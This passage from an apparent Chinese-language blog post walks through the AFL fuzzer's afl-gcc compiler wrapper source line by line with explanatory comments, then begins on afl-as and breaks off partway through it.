        <content type="html"><![CDATA[<h1 id="AFL代码详读（上）"><a href="#AFL代码详读（上）" class="headerlink" title="AFL代码详读（上）"></a>AFL代码详读（上）</h1><h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 声明使用AFL的主程序宏，用于某些平台的特殊处理 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AFL_MAIN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 包含头文件部分开始 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span>       <span class="comment">// AFL的编译配置信息（自动生成）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span>        <span class="comment">// AFL自定义数据类型（如u8、u32等）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;debug.h&quot;</span>        <span class="comment">// 调试输出相关函数（SAYF, FATAL等）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;alloc-inl.h&quot;</span>    <span class="comment">// AFL自定义内存分配函数（带错误检查）</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标准库头文件 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>        <span class="comment">// 标准输入输出函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span>       <span class="comment">// POSIX系统调用（access, execvp等）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>       <span class="comment">// 标准库函数（getenv, exit等）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span>       <span class="comment">// 字符串处理函数（strrchr, strncmp等）</span></span></span><br><span class="line"><span class="comment">/* 包含头文件部分结束 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局变量声明开始 */</span></span><br><span class="line"><span class="keyword">static</span> u8*  as_path;        <span class="comment">// 存储afl-as汇编器路径的指针</span></span><br><span class="line"><span class="keyword">static</span> u8** cc_params;      <span class="comment">// 最终要传递给真实编译器的参数数组</span></span><br><span class="line"><span class="keyword">static</span> u32  cc_par_cnt = <span class="number">1</span>; <span class="comment">// 参数计数器（从1开始，包含argv[0]）</span></span><br><span class="line"><span class="keyword">static</span> u8   be_quiet,       <span class="comment">// 静默模式标志（不显示横幅等信息）</span></span><br><span class="line">            clang_mode;    <span class="comment">// 是否以clang模式运行的标志</span></span><br><span class="line"><span class="comment">/* 全局变量声明结束 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*-----------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">/* 查找AFL汇编器路径的函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*-----------------------*/</span>    </span><br><span class="line"><span class="comment">/* 先从环境变量中寻找AFL_PATH，如果找到了则设置as_path为AFL_PATH*/</span></span><br><span class="line">  u8 *afl_path = getenv(<span class="string">&quot;AFL_PATH&quot;</span>); <span class="comment">// 尝试从环境变量获取路径</span></span><br><span class="line">  u8 *slash, *tmp; <span class="comment">// 临时变量：slash用于路径分割，tmp用于构建路径字符串</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 环境变量检查分支 */</span></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建完整路径字符串：AFL_PATH/as</span></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件是否存在且可执行</span></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;  <span class="comment">// 验证成功，保存路径</span></span><br><span class="line">      ck_free(tmp);        <span class="comment">// 释放临时内存</span></span><br><span class="line">      <span class="keyword">return</span>;              <span class="comment">// 直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ck_free(tmp); <span class="comment">// 释放构建失败的路径字符串</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*-----------------------*/</span>    </span><br><span class="line"><span class="comment">/* 如果没有找到则从argv0寻找*/</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>); <span class="comment">// 查找最后一个&#x27;/&#x27;字符位置</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123; <span class="comment">// 如果argv0包含路径信息</span></span><br><span class="line"></span><br><span class="line">    u8 *dir; <span class="comment">// 目录路径临时变量</span></span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>; <span class="comment">// 暂时截断字符串，获取目录路径</span></span><br><span class="line">    dir = ck_strdup(argv0); <span class="comment">// 复制目录路径（分配堆内存）</span></span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>; <span class="comment">// 恢复原始argv0字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建路径：目录路径/afl-as</span></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件可执行性</span></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;   <span class="comment">// 验证成功，保存路径</span></span><br><span class="line">      ck_free(tmp);    <span class="comment">// 释放临时路径字符串</span></span><br><span class="line">      <span class="keyword">return</span>;          <span class="comment">// 直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理分支内分配的内存</span></span><br><span class="line">    ck_free(tmp);</span><br><span class="line">    ck_free(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 硬编码路径检查分支 */</span></span><br><span class="line">  <span class="keyword">if</span> (!access(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123; <span class="comment">// 检查默认安装路径</span></span><br><span class="line">    as_path = AFL_PATH;  <span class="comment">// 使用编译时定义的AFL_PATH</span></span><br><span class="line">    <span class="keyword">return</span>; </span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*-----------------------*/</span>    </span><br><span class="line"><span class="comment">/* 所有路径查找失败后的致命错误 */</span></span><br><span class="line">  FATAL(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*-----------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">/* 编辑编译器参数的函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, <span class="comment">// FORTIFY_SOURCE是否已设置的标志</span></span><br><span class="line">     asan_set = <span class="number">0</span>;    <span class="comment">// 地址消毒剂是否已设置的标志</span></span><br><span class="line">  u8 *name;           <span class="comment">// 存储程序名称的指针</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__) <span class="comment">// FreeBSD特定处理</span></span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;      <span class="comment">// -m32参数是否存在的标志</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 分配参数数组内存（原始参数+128个额外参数） */</span></span><br><span class="line">  cc_params = ck_alloc((argc + <span class="number">128</span>) * <span class="keyword">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 解析程序名称 */</span></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>); <span class="comment">// 查找最后一个&#x27;/&#x27;位置</span></span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++; <span class="comment">// 获取纯程序名（不含路径）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 判断是否clang模式 */</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123; <span class="comment">// 检测程序名前缀</span></span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>; <span class="comment">// 设置clang模式标志</span></span><br><span class="line">    setenv(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>); <span class="comment">// 向后续编译流程（如汇编器、链接器）传递「当前使用 Clang」的信息，以启用 Clang 特有的插桩逻辑。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 处理C++特殊情况 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123; <span class="comment">// 精确匹配C++版本</span></span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);  <span class="comment">// 检查自定义C++编译器</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);    <span class="comment">// 检查自定义C编译器</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 处理其他编译器（GCC系列） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__ <span class="comment">// MacOS特殊处理</span></span></span><br><span class="line">    <span class="comment">// 因为Mac的gcc实际上是clang别名，需要特别处理</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误处理分支</span></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang...&quot;</span>);</span><br><span class="line">      FATAL(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// 非Mac系统处理</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 标准GCC处理流程 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123; <span class="comment">// GCJ特殊处理</span></span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 默认GCC情况</span></span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 参数处理循环（跳过argv[0]） */</span></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123; <span class="comment">// 递减参数计数器</span></span><br><span class="line">    u8* cur = *(++argv); <span class="comment">// 获取当前参数指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 处理用户指定的-B参数（必须覆盖） */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123; <span class="comment">// 匹配-B开头的参数</span></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) WARNF(<span class="string">&quot;-B is already set, overriding&quot;</span>); <span class="comment">// 显示警告</span></span><br><span class="line">      <span class="comment">// 处理-B后带空格的情况（如&quot;-B /path&quot;）</span></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>; <span class="comment">// 跳过这个参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 过滤冲突参数 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>; <span class="comment">// 禁用clang集成汇编器</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;         <span class="comment">// 过滤管道参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="comment">/* FreeBSD下32位模式检测 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>; <span class="comment">// 记录-m32参数存在</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测安全相关参数 */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) || </span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>; <span class="comment">// 地址/内存消毒剂</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>; <span class="comment">// 强化检测</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加有效参数到列表 */</span></span><br><span class="line">    cc_params[cc_par_cnt++] = cur; <span class="comment">// 复制当前参数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 添加AFL强制参数 */</span></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;      <span class="comment">// 指定汇编器路径参数</span></span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;   <span class="comment">// 之前找到的as路径</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clang模式特殊处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>; <span class="comment">// 强制使用外部汇编器</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 加固选项处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123; <span class="comment">// 如果启用加固模式</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>; <span class="comment">// 全栈保护</span></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set) <span class="comment">// 如果用户未设置FORTIFY</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>; <span class="comment">// 添加强化宏定义</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 消毒剂处理逻辑 */</span></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123; <span class="comment">// 如果用户已启用消毒剂</span></span><br><span class="line">    setenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>); <span class="comment">// 通知后续流程使用ASAN</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123; <span class="comment">// 如果通过环境变量启用</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) <span class="comment">// 消毒剂互斥检查</span></span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>)) </span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>; <span class="comment">// 取消强化宏</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>; <span class="comment">// 添加消毒剂参数</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123; <span class="comment">// 内存消毒剂处理</span></span><br><span class="line">    <span class="comment">// ...类似ASAN的处理（为节省篇幅省略重复注释）...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 优化参数处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123; <span class="comment">// 默认添加优化参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="comment">/* FreeBSD下clang的-m32调试问题规避 */</span></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set) <span class="comment">// 非clang模式或未使用-m32时</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>; <span class="comment">// 调试符号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;    <span class="comment">// 添加调试符号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;           <span class="comment">// 最高优化级别</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>; <span class="comment">// 循环展开优化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加fuzzing相关宏定义 */</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>; <span class="comment">// 标识AFL编译</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 禁用内建函数处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123; <span class="comment">// 如果要求禁用内建函数</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;  <span class="comment">// 字符串比较</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>; <span class="comment">// 大小写不敏感比较</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;   <span class="comment">// 内存比较</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;   <span class="comment">// 子字符串查找</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 终止参数数组 */</span></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>; <span class="comment">// execvp要求NULL结尾</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*-----------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">/* 主函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 静默模式检测 */</span></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123; <span class="comment">// 检查标准错误是否是终端</span></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>; <span class="comment">// 设置静默标志</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 参数数量检查 */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123; <span class="comment">// 没有实际参数时显示帮助</span></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 核心处理流程 */</span></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);     <span class="comment">// 查找as路径</span></span><br><span class="line">  edit_params(argc, argv); <span class="comment">// 构建参数列表</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 执行真实编译器 */</span></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params); <span class="comment">// 替换当前进程</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 执行失败处理 */</span></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 理论不会执行到这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>afl-gcc的核心功能就是找到AFL中as所在文件夹的路径并调用gcc并将该路径加入，设置必要参数，一些宏，以及环境变量。</p><p>我们测试一下，在main函数中添加下面的代码，打印一下参数</p><p><img src="C:/Users/Kr0emer/AppData/Roaming/Typora/typora-user-images/image-20250529104509081.png" alt="添加代码"></p><p><img src="C:/Users/Kr0emer/AppData/Roaming/Typora/typora-user-images/image-20250529105657479.png" alt="结果"></p><h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AFL 汇编器包装器核心代码</span></span><br><span class="line"><span class="comment">// 主要功能：在 GCC/Clang 生成的汇编代码中插入覆盖率追踪桩代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AFL_MAIN  <span class="comment">// 主程序标识</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span>     <span class="comment">// AFL 配置头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span>      <span class="comment">// 自定义类型定义</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;debug.h&quot;</span>      <span class="comment">// 调试输出宏</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;alloc-inl.h&quot;</span>  <span class="comment">// 安全内存分配函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afl-as.h&quot;</span>     <span class="comment">// 桩代码定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8** as_params;          <span class="comment">// 传递给真实汇编器的参数数组</span></span><br><span class="line"><span class="keyword">static</span> u8*  input_file;         <span class="comment">// 原始输入文件名</span></span><br><span class="line"><span class="keyword">static</span> u8*  modified_file;      <span class="comment">// 插桩后的临时文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8   be_quiet,           <span class="comment">// 静默模式标志</span></span><br><span class="line">            clang_mode,         <span class="comment">// Clang 模式标志</span></span><br><span class="line">            pass_thru,          <span class="comment">// 直接透传模式（不插桩）</span></span><br><span class="line">            just_version,       <span class="comment">// 仅显示版本标志</span></span><br><span class="line">            sanitizer;          <span class="comment">// ASAN/MSAN 模式标志</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u32  inst_ratio = <span class="number">100</span>,   <span class="comment">// 插桩概率百分比（默认100%）</span></span><br><span class="line">            as_par_cnt = <span class="number">1</span>;     <span class="comment">// 当前参数计数器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据编译环境设置默认位宽（32/64位）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"><span class="keyword">static</span> u8   use_64bit = <span class="number">1</span>;      <span class="comment">// 64位模式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">static</span> u8   use_64bit = <span 